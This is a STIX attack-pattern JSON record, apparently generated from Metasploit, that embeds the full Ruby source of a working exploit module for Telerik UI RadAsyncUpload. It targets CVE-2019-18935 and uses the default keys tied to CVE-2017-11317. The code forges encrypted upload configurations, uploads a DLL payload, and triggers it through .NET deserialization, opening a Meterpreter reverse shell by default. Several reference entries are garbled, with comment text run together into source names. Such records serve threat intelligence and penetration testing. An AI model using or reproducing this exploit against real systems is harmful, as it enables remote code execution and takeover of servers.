{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e9d8ae33-fd12-4937-91e1-81a3b30f486c",
    "created": "2024-08-14T16:52:21.808577Z",
    "modified": "2024-08-14T16:52:21.808581Z",
    "name": "Telerik UI ASP.NET AJAX RadAsyncUpload Deserialization",
    "description": " This module exploits the .NET deserialization vulnerability within the RadAsyncUpload (RAU) component of Telerik",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/telerik_rau_deserialization.rb",
            "external_id": "telerik_rau_deserialization.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bao7uo/RAU_crypto"
        },
        {
            "source_name": "reference",
            "url": "https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/straightblast/UnRadAsyncUpload/wiki"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/noperator/CVE-2019-18935"
        },
        {
            "source_name": "reference",
            "url": "https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization"
        },
        {
            "source_name": "reference",
            "url": "https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html"
        },
        {
            "source_name": "reference",
            "url": "https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui"
        },
        {
            "source_name": "cryptographickeysusedbyRAU.ThedefaultvaluesusedbythismodulearerelatedtoCVE-2017-11317",
            "external_id": "whichonce"
        },
        {
            "source_name": "MarkusWulftange",
            "external_id": "#(@mwulftange)discoveryofCVE-2019-18935"
        },
        {
            "source_name": "CalebGross",
            "external_id": "#(@noperator)researchonCVE-2019-18935"
        },
        {
            "source_name": "AlvaroMu\u00f1oz",
            "external_id": "#(@pwntester)discoveryofCVE-2017-11317"
        },
        {
            "source_name": "OleksandrMirosh",
            "external_id": "#(@olekmirosh)discoverofCVE-2017-11317"
        },
        {
            "source_name": "straightblast",
            "external_id": "#(@straight_blast)discoveryofCVE-2017-11317"
        },
        {
            "source_name": "DisclosureDate=>2019-12-09",
            "external_id": "#TelerikarticleonCVE-2019-18935"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  SALT = \"\\x3a\\x54\\x5b\\x19\\x0a\\x22\\x1d\\x44\\x3c\\x58\\x2c\\x33\\x01\".b\n  # default keys per CVE-2017-11317\n  DEFAULT_RAU_SIGNING_KEY = 'PrivateKeyForHashOfUploadConfiguration'.freeze\n  DEFAULT_RAU_ENCRYPTION_KEY = 'PrivateKeyForEncryptionOfRadAsyncUploadConfiguration'.freeze\n  CVE_2017_11317_REFERENCES = [\n    ['CVE', '2017-11317'], # Unrestricted File Upload via Weak Encryption\n    ['URL', 'https://github.com/bao7uo/RAU_crypto'],\n    ['URL', 'https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload'],\n    ['URL', 'https://github.com/straightblast/UnRadAsyncUpload/wiki'],\n  ].freeze\n  CVE_2019_18935_REFERENCES = [\n    ['CVE', '2019-18935'], # Remote Code Execution via Insecure Deserialization\n    ['URL', 'https://github.com/noperator/CVE-2019-18935'],\n    ['URL', 'https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization'],\n    ['URL', 'https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html'],\n    ['URL', 'https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui'],\n  ].freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Telerik UI ASP.NET AJAX RadAsyncUpload Deserialization',\n        'Description' => %q{\n          This module exploits the .NET deserialization vulnerability within the RadAsyncUpload (RAU) component of Telerik\n          UI ASP.NET AJAX that is identified as CVE-2019-18935. In order to do so the module must upload a mixed mode .NET\n          assembly DLL which is then loaded through the deserialization flaw. Uploading the file requires knowledge of the\n          cryptographic keys used by RAU. The default values used by this module are related to CVE-2017-11317, which once\n          patched randomizes these keys. It is also necessary to know the version of Telerik UI ASP.NET that is running.\n          This version number is in the format YYYY.#(.###)? where YYYY is the year of the release (e.g. '2020.3.915').\n        },\n        'Author' => [\n          'Spencer McIntyre', # Metasploit module\n          'Paul Taylor', # (@bao7uo) Python PoCs\n          'Markus Wulftange', # (@mwulftange) discovery of CVE-2019-18935\n          'Caleb Gross', # (@noperator) research on CVE-2019-18935\n          'Alvaro Mu\u00f1oz', # (@pwntester) discovery of CVE-2017-11317\n          'Oleksandr Mirosh', # (@olekmirosh) discover of CVE-2017-11317\n          'straightblast', # (@straight_blast) discovery of CVE-2017-11317\n        ],\n        'License' => MSF_LICENSE,\n        'References' => CVE_2017_11317_REFERENCES + CVE_2019_18935_REFERENCES,\n        'Platform' => 'win',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' => [['Windows', {}],],\n        'Payload' => { 'Space' => 2048 },\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2019-12-09', # Telerik article on CVE-2019-18935\n        'Notes' => {\n          'Reliability' => [UNRELIABLE_SESSION],\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        },\n        'Privileged' => true\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The base path to the web application', '/' ]),\n      OptString.new('FILE_NAME', [ false, 'The base file name for the upload (default will be random)' ]),\n      OptString.new('DESTINATION', [ true, 'The destination folder for the upload', 'C:\\\\Windows\\\\Temp' ]),\n      OptString.new('RAU_ENCRYPTION_KEY', [ true, 'The encryption key for the RAU configuration data', DEFAULT_RAU_ENCRYPTION_KEY ]),\n      OptString.new('RAU_SIGNING_KEY', [ true, 'The signing key for the RAU configuration data', DEFAULT_RAU_SIGNING_KEY ]),\n      OptString.new('VERSION', [ false, 'The Telerik UI ASP.NET AJAX version' ])\n    ])\n  end\n\n  def dest_file_basename\n    @dest_file_name = @dest_file_name || datastore['FILE_NAME'] || \"#{Rex::Text.rand_text_alphanumeric(rand(4..35))}.dll\"\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'Telerik.Web.UI.WebResource.axd'),\n      'vars_get' => { 'type' => 'rau' }\n    })\n    return CheckCode::Safe unless res&.code == 200\n    return CheckCode::Safe unless res.get_json_document&.dig('message') =~ /RadAsyncUpload handler is registered succesfully/\n\n    if datastore['VERSION'].blank?\n      @version = enumerate_version\n    else\n      begin\n        upload_file('', datastore['VERSION'])\n      rescue Msf::Exploit::Failed\n        return CheckCode::Safe\n      end\n\n      @version = datastore['VERSION']\n    end\n\n    if !@version.nil? && datastore['RAU_SIGNING_KEY'] == DEFAULT_RAU_SIGNING_KEY && datastore['RAU_ENCRYPTION_KEY'] == DEFAULT_RAU_ENCRYPTION_KEY\n      print_status('Server is using default crypto keys and is vulnerable to CVE-2017-11317')\n      report_vuln({\n        host: rhost,\n        port: rport,\n        proto: 'tcp',\n        name: 'Unrestricted File Upload via Weak Encryption',\n        refs: CVE_2017_11317_REFERENCES.map { |ctx_id, ctx_val| SiteReference.new(ctx_id, ctx_val) }\n      })\n    end\n\n    # with custom errors enabled (which is the default), it's not possible to test for the serialization flaw without triggering it\n    CheckCode::Detected\n  end\n\n  def exploit\n    fail_with(Failure::BadConfig, 'No version was specified and it could not be enumerated') if @version.nil?\n    upload_file(generate_payload_dll({ mixed_mode: true }), @version)\n    execute_payload\n  end\n\n  def execute_payload\n    print_status('Executing the payload...')\n    serialized_object = { 'Path' => \"#{datastore['DESTINATION'].chomp('\\\\').gsub('\\\\', '/')}/#{dest_file_basename}.tmp\" }\n    serialized_object_type = Msf::Util::DotNetDeserialization::Assemblies::VERSIONS['4.0.0.0']['System.Configuration.Install']['System.Configuration.Install.AssemblyInstaller']\n\n    msg = rau_mime_payload(serialized_object, serialized_object_type.to_s)\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'Telerik.Web.UI.WebResource.axd'),\n        'vars_get' => { 'type' => 'rau' },\n        'method' => 'POST',\n        'data' => msg.to_s,\n        'ctype' => \"multipart/form-data; boundary=#{msg.bound}\"\n      }, 5\n    )\n    # this request to execute the payload times out on success and returns 200 when it fails, for example because the\n    # AllowedCustomMetaDataTypes setting is blocking the necessary code path\n    fail_with(Failure::UnexpectedReply, 'Failed to execute the payload') if res&.code == 200\n  end\n\n  def upload_file(file_contents, version)\n    target_folder = encrypt('')\n    temp_target_folder = encrypt(datastore['DESTINATION'].encode('UTF-16LE'))\n    if (version =~ /(\\d{4})\\.\\d+.\\d+/) && Regexp.last_match(1).to_i > 2016\n      # signing is only necessary for versions >= 2017.1.118 (versions that don't match the regex don't require signing)\n      target_folder << sign(target_folder)\n      temp_target_folder << sign(temp_target_folder)\n    end\n\n    serialized_object = {\n      'TargetFolder' => target_folder,\n      'TempTargetFolder' => temp_target_folder,\n      'MaxFileSize' => 0,\n      'TimeToLive' => {\n        'Ticks' => 1440000000000,\n        'Days' => 0,\n        'Hours' => 40,\n        'Minutes' => 0,\n        'Seconds' => 0,\n        'Milliseconds' => 0,\n        'TotalDays' => 1.6666666666666665,\n        'TotalHours' => 40,\n        'TotalMinutes' => 2400,\n        'TotalSeconds' => 144000,\n        'TotalMilliseconds' => 144000000\n      },\n      'UseApplicationPoolImpersonation' => false\n    }\n    serialized_object_type = \"Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=#{version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4\"\n\n    msg = rau_mime_payload(serialized_object, serialized_object_type, file_contents: file_contents)\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(target_uri.path, 'Telerik.Web.UI.WebResource.axd'),\n        'vars_get' => { 'type' => 'rau' },\n        'method' => 'POST',\n        'data' => msg.to_s,\n        'ctype' => \"multipart/form-data; boundary=#{msg.bound}\"\n      }\n    )\n    fail_with(Failure::UnexpectedReply, 'The upload failed') unless res&.code == 200\n    metadata = JSON.parse(decrypt(res.get_json_document['metaData']).force_encoding('UTF-16LE'))\n    dest_path = \"#{datastore['DESTINATION'].chomp('\\\\')}\\\\#{metadata['TempFileName']}\"\n    print_good(\"Uploaded #{file_contents.length} bytes to: #{dest_path}\")\n    register_file_for_cleanup(dest_path)\n  end\n\n  def rau_mime_payload(serialized_object, serialized_object_type, file_contents: '')\n    metadata = { 'TotalChunks' => 1, 'ChunkIndex' => 0, 'TotalFileSize' => 1, 'UploadID' => dest_file_basename }\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"#{encrypt(serialized_object.to_json.encode('UTF-16LE'))}&#{encrypt(serialized_object_type.encode('UTF-16LE'))}\", nil, nil, 'form-data; name=\"rauPostData\"')\n    post_data.add_part(file_contents, 'application/octet-stream', 'binary', \"form-data; name=\\\"file\\\"; filename=\\\"#{dest_file_basename}\\\"\")\n    post_data.add_part(dest_file_basename, nil, nil, 'form-data; name=\"fileName\"')\n    post_data.add_part('application/octet-stream', nil, nil, 'form-data; name=\"contentType\"')\n    post_data.add_part('1970-01-01T00:00:00.000Z', nil, nil, 'form-data; name=\"lastModifiedDate\"')\n    post_data.add_part(metadata.to_json, nil, nil, 'form-data; name=\"metadata\"')\n    post_data\n  end\n\n  def enumerate_version\n    print_status('Enumerating the Telerik UI ASP.NET AJAX version, this will fail if the keys are incorrect')\n    File.open(File.join(Msf::Config.data_directory, 'wordlists', 'telerik_ui_asp_net_ajax_versions.txt'), 'rb').each_line do |version|\n      version.strip!\n      next if version.start_with?('#')\n\n      vprint_status(\"Checking version: #{version}\")\n      begin\n        upload_file('', version)\n      rescue Msf::Exploit::Failed\n        next\n      end\n\n      print_good(\"The Telerik UI ASP.NET AJAX version has been identified as: #{version}\")\n      return version\n    end\n\n    nil\n  end\n\n  #\n  # Crypto Functions\n  #\n  def get_cipher(mode)\n    # older versions might need to use pbkdf1\n    blob = OpenSSL::PKCS5.pbkdf2_hmac_sha1(datastore['RAU_ENCRYPTION_KEY'], SALT, 1000, 48)\n    cipher = OpenSSL::Cipher.new('AES-256-CBC').send(mode)\n    cipher.key = blob.slice(0, 32)\n    cipher.iv = blob.slice(32, 48)\n    cipher\n  end\n\n  def decrypt(cipher_text)\n    cipher = get_cipher(:decrypt)\n    cipher.update(Rex::Text.decode_base64(cipher_text)) + cipher.final\n  end\n\n  def encrypt(plain_text)\n    cipher = get_cipher(:encrypt)\n    cipher_text = ''\n    cipher_text << cipher.update(plain_text) unless plain_text.empty?\n    cipher_text << cipher.final\n    Rex::Text.encode_base64(cipher_text)\n  end\n\n  def sign(data)\n    Rex::Text.encode_base64(OpenSSL::HMAC.digest('SHA256', datastore['RAU_SIGNING_KEY'], data))\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "win'"
    ]
}